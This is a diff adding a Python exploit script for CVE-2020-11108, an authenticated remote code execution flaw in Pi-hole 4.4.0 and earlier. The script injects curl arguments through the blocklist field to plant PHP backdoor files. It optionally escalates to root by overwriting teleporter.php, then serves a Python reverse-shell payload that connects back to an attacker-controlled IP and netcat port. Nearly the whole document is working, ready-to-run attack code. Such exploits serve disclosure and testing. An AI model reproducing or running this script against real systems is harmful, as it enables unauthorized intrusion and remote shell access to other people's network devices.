@@ -1,0 +1,254 @@
+# Exploit Title: Pi-hole 4.4.0 - Remote Code Execution (Authenticated)
+# Date: 2020-05-22
+# Exploit Author: Photubias
+# Vendor Advisory: [1] https://github.com/pi-hole/AdminLTE
+# Version: Pi-hole <=4.4.0 + Web <=4.3.3
+# Tested on: Pi-hole v4.4.0-g9e49077, Web v4.3.3,v4.3.2-1-g4f824be, FTL v5.0 (on Debian 10)
+# CVE: CVE-2020-11108
+
+#!/usr/bin/env python3
+'''
+	Copyright 2020 Photubias(c)        
+        This program is free software: you can redistribute it and/or modify
+        it under the terms of the GNU General Public License as published by
+        the Free Software Foundation, either version 3 of the License, or
+        (at your option) any later version.
+
+        This program is distributed in the hope that it will be useful,
+        but WITHOUT ANY WARRANTY; without even the implied warranty of
+        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+        GNU General Public License for more details.
+
+        You should have received a copy of the GNU General Public License
+        along with this program.  If not, see <http://www.gnu.org/licenses/>.
+        
+        Based (and improved on): https://github.com/Frichetten/CVE-2020-11108-PoC/blob/master/cve-2020-11108-rce.py
+        
+        File name CVE-2020-11108.py
+        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be
+        
+        ## Vulnerable setup instructions (from clean Debian 10-Buster):
+        > apt update && apt install -y curl
+        > curl -sSL https://install.pi-hole.net | bash
+        > pihole checkout web release/v4.3.3
+        > cd /etc/.pihole/ && git checkout v4.4
+        > pihole -r ## Select reconfigure
+        
+        This is a native implementation without requirements, written in Python 3.
+        Works equally well on Windows as Linux (as MacOS, probably ;-)
+        
+        Features:
+        * Does a reliable check before exploitation (not based on version numbers)
+        * Performs normal RCE without Privilege Escalation (wich is more trust worthy)
+        * Asks before running Root RCE (as this overwrites certain files)
+        * Performs a cleanup in all cases (success / failure)
+'''
+
+import urllib.request, ssl, http.cookiejar, sys, string, random
+import socket, _thread, time
+
+## Default vars; change at will
+_sURL = '192.168.50.130'
+_sPASSWORD = '6DS4QtW5'
+_iTIMEOUT = 5
+_sLOCALIP = '192.168.50.1'
+_sFILENAME = 'fun2.php'
+_sLOCALNCPORT = '4444' ## Make sure to set up a listener on this port first
+
+## Ignore unsigned certs
+ssl._create_default_https_context = ssl._create_unverified_context
+
+## Keep track of cookies between requests
+cj = http.cookiejar.CookieJar()
+oOpener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+
+def randomString(iStringLength=8):
+    sLetters = string.ascii_lowercase
+    return ''.join(random.choice(sLetters) for i in range(iStringLength))
+
+def postData(sURL, lData, bEncode = True):
+    try:
+        if bEncode: oData = urllib.parse.urlencode(lData).encode()
+        else: oData = str(lData).encode()
+        oRequest = urllib.request.Request(url = sURL, data = oData)
+        return oOpener.open(oRequest, timeout = _iTIMEOUT)
+    except:
+        print('----- ERROR, site down?')
+        sys.exit(1)
+
+def getEndpoint():
+    if not _sURL[:4].lower() == 'http': sURL = 'http://' + _sURL
+    else: sURL = _sURL
+    if not sURL[:-1] == '/': sURL += '/'
+    if not '/admin' in sURL: sURL += 'admin'
+    try:
+        oRequest = urllib.request.Request(sURL)
+        oResponse = oOpener.open(oRequest, timeout = _iTIMEOUT)
+    except:
+        print('[-] Error: ' + sURL + ' not responding')
+        exit(1)
+    if oResponse.code == 200:
+        print('[+] Vulnerable URL is ' + sURL)
+        return sURL
+    else:
+        print('[-] Error: ' + sURL + ' does not exist?')
+        exit(1)
+
+def startListener(sPayload, iSockTimeout):
+    ## Listener must always be on port 80, does not work otherwise
+    oSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print('[!] Binding to '+_sLOCALIP+':80')
+    oSock.bind((_sLOCALIP,80))
+    oSock.settimeout(iSockTimeout)
+    oSock.listen()
+
+    while True:
+        try: oConn,sAddr= oSock.accept()
+        except: break
+        print('[+] Yes, we have an incoming connection from '+str(sAddr[0]))
+        oConn.sendall(sPayload.encode())
+        oConn.close()
+        break
+    oSock.close()
+    print('[!] Closing Listener')
+
+def doLogin(sURL, sPassword):
+    sPath = '/index.php?login'
+    lData = {'pw':sPassword}
+    oResponse = postData(sURL + sPath, lData)
+    sResult = oResponse.read().decode(errors='ignore')
+    if 'Wrong password' in sResult:
+        print('Wrong password')
+        sys.exit(1)
+    return True
+
+def getToken(sURL):
+    sPath = '/settings.php?tab=blocklists'
+    oResponse = oOpener.open(urllib.request.Request(sURL + sPath), timeout = _iTIMEOUT)
+    sResult = oResponse.read().decode(errors='ignore')
+    if 'id=\'token\'' in sResult:
+        return sResult.split('id=\'token\' hidden>')[1].split('<')[0]
+    else:
+        print('[-] Error in getting a token')
+        sys.exit(1)
+    
+def createBackdoor(sURL, sFilename):
+    sToken = getToken(sURL)
+    sPath = '/settings.php?tab=blocklists'
+    lData = {'newuserlists':'http://' + _sLOCALIP + '#" -o ' + sFilename + ' -d "', 'field':'adlists', 'token':sToken, 'submit':'save'}
+    #lData = {'newuserlists':'http://' + _sLOCALIP + '#" -o fun.php -d "', 'field':'adlists', 'token':sToken, 'submit':'saveupdate'}
+    oResponse = postData(sURL + sPath, lData)
+    if oResponse.code == 200:
+        sResult = oResponse.read().decode(errors='ignore')
+        arrBlocklists = sResult.split('target="_new"')
+        sID = str(len(arrBlocklists)-2)
+        print('[+] Creation success, ID is '+sID+'!')
+        return sID
+    else:
+        return ''
+
+
+def doUpdate(sURL):
+    sPath = '/scripts/pi-hole/php/gravity.sh.php'
+    try:
+        oResponse = oOpener.open(urllib.request.Request(sURL + sPath), timeout = _iTIMEOUT)
+        if oResponse.code == 200: print('[+] Update succeeded.')
+        return True
+    except:
+        print('[-] Error; callback failed, maybe a firewall issue?')
+        return False
+
+def callExploit(sURL, sFilename = _sFILENAME):
+    sPath = '/scripts/pi-hole/php/' + sFilename
+    print('[+] Calling ' + sURL + sPath)
+    try:
+        oResponse = oOpener.open(urllib.request.Request(sURL + sPath), timeout = _iTIMEOUT)
+        if oResponse.code == 200: print('[+] Calling exploit succeeded.')
+        print(oResponse.read().decode(errors='ignore'))
+    except:
+        pass
+
+def removeEntry(sURL, sID):
+    print('[+] Cleaning up now.')
+    sToken = getToken(sURL)
+    sPath = '/settings.php?tab=blocklists'
+    lData = {'adlist-del-'+sID:'on', 'newuserlists':'', 'field':'adlists', 'token':sToken, 'submit':'save'}
+    oResponse = postData(sURL + sPath, lData)
+    if oResponse.code == 200:
+        print('[+] Remove success')
+
+def main():
+    global _sURL, _sPASSWORD, _iTIMEOUT, _sLOCALIP, _sFILENAME, _sLOCALNCPORT
+    if len(sys.argv) == 1:
+        print('[!] No arguments found: python3 CVE-2020-11108.py <dstIP> <srcIP> <PWD>')
+        print('    Example: ./CVE-2020-11108.py 192.168.50.130 192.168.50.1 6DS4QtW5')
+        print('    But for now, I will ask questions')
+        sAnswer = input('[?] Please enter the IP address for Pi-Hole ([' + _sURL + ']): ')
+        if not sAnswer == '': _sURL = sAnswer
+        sAnswer = input('[?] Please enter the your (reachable) IP address to launch listeners ([' + _sLOCALIP + ']): ')
+        if not sAnswer == '': _sLOCALIP = sAnswer
+        sAnswer = input('[?] Please enter the password for Pi-Hole ([' + _sPASSWORD + ']): ')
+        if not sAnswer == '': _sPASSWORD = sAnswer
+    else:
+        _sURL = sys.argv[1]
+        _sLOCALIP = sys.argv[2]
+        _sPASSWORD = sys.argv[3]
+    
+    ## MAIN
+    sURL = getEndpoint() ## Will also set the initial SessionID
+    doLogin(sURL, _sPASSWORD)
+    
+    ## Creating backdoor (1) ## the old 'fun.php'
+    sFilename = randomString() + '.php'
+    sID = createBackdoor(sURL, sFilename)
+    
+    ## Launch first payload listener and send 200 OK
+    _thread.start_new_thread(startListener,('HTTP/1.1 200 OK\n\nCVE-2020-11108\n',5,))
+    if doUpdate(sURL):
+        print('[+] This system is vulnerable!')
+    
+    ## Question Time
+    sAnswer = input('Want to continue with exploitation? (Or just run cleanup)? [y/N]: ')
+    if not sAnswer.lower() == 'y':
+        removeEntry(sURL, sID)
+        sys.exit(0)
+    sAnswer = input('Want root access? (Breaks the application!!) [y/N]: ')
+    if sAnswer.lower() == 'y': bRoot = True
+    else: bRoot = False
+    
+    if bRoot:
+        print('[!] Allright, going for the root shell')
+        ## Launch payload listener and send root shell
+        _sPayload = '''<?php shell_exec("sudo pihole -a -t") ?>'''
+        _thread.start_new_thread(startListener,(_sPayload,5,))
+        doUpdate(sURL)
+    
+        ## Creating backdoor (2), overwriting teleporter.php
+        sID2 = createBackdoor(sURL, 'teleporter.php')
+    
+        ## Launch payload listener for a new 200 OK
+        _thread.start_new_thread(startListener,('HTTP/1.1 200 OK\n\nCVE-2020-11108\n',5,))
+        doUpdate(sURL)
+    
+    input('Ok, make sure to have a netcat listener on "' + _sLOCALIP + ':' + _sLOCALNCPORT + '" ("nc -lnvp ' + _sLOCALNCPORT + '") and press enter to continue...')
+    
+    ## Launch shell payload listener:
+    _sPayload = '''<?php
+    shell_exec("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"%s\\\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);'")
+    ?>
+    ''' %(_sLOCALIP, _sLOCALNCPORT)
+    #_sPayload = '''<?php system($_GET['cmd']); ?>''' ## this works perfectly, but the URL is authenticated
+    _thread.start_new_thread(startListener,(_sPayload,5,))
+    doUpdate(sURL)
+    
+    ## Launching the payload, will create new PHP file
+    callExploit(sURL, sFilename)
+    
+    ## Remove entry again
+    if bRoot: removeEntry(sURL, sID2)
+    removeEntry(sURL, sID)
+    
+    if len(sys.argv) == 1: input('[+] All done, press enter to exit')
+
+if __name__ == "__main__":
+    main()
